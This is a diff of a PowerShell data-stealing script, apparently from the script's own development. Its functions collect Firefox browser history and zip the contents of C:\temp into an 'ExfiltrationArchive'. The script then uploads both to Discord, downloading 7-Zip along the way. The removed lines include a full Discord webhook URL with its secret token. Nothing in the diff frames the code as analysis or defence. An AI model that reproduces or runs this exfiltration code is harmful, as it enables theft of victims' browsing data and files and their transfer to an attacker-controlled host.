@@ -47,20 +47,8 @@ function Upload-Discord {
 }
 
 
-# Declare global variables for ZipAndUploadToDiscord
-$sourcePath = "C:\temp"
-$zipFilePath = "C:\temp\ExfiltrationArchive.zip"
-#$discordUrl = 'https://discord.com/api/webhooks/1199773516900352161/k8dAsA1xT4os6JLC8WstxzDyrhnmw2R2UrdT3AxcYWbifQppCDgAO9q3zcLY0756svJy'
-$discordMessage = "Exfiltration Archive"
-
 # Function to create a zip archive using 7-Zip and upload to Discord
 function ZipAndUploadToDiscord {
-    param (
-        [string]$sourcePath,
-        [string]$zipFilePath,
-        [string]$discordUrl,
-        [string]$discordMessage
-    )
 
     # Download 7-Zip
     Invoke-WebRequest -Uri https://www.7-zip.org/a/7za920.zip -OutFile 7z.zip
@@ -69,10 +57,10 @@ function ZipAndUploadToDiscord {
     Expand-Archive -Path .\7z.zip -DestinationPath .\7z -Force
 
     # Create a zip archive using 7-Zip
-    .\7z\7za.exe a -tzip "$zipFilePath" "$sourcePath\*" -r
+    .\7z\7za.exe a -tzip "C:\temp\ExfiltrationArchive.zip" "C:\temp*" -r
 
     # Call Upload-Discord to send the zip archive to Discord
-    Upload-Discord -file $zipFilePath -text $discordMessage -discordUrl $discordUrl
+    Upload-Discord -file C:\temp\ExfiltrationArchive.zip -text "Exfiltration Archive :"
 
     # Cleanup: Remove 7-Zip files
     Remove-Item -Path .\7z.zip, .\7z -Recurse -Force
@@ -109,9 +97,8 @@ function Exfiltration {
     GrabBrowserData -Browser "firefox" -DataType "history" | Out-File -Append -FilePath "BrowserData.txt"
     Upload-Discord -file "BrowserData.txt" -text "Browser Data:"
 
-    # Call the ZipAndUploadToDiscord
-    ZipAndUploadToDiscord -sourcePath $sourcePath -zipFilePath $zipFilePath -discordUrl $discordUrl -discordMessage $discordMessage
-    
+    #Call ZipAndUploadToDiscord
+    ZipAndUploadToDiscord
 }
 
 function AntiSpywareInfo {
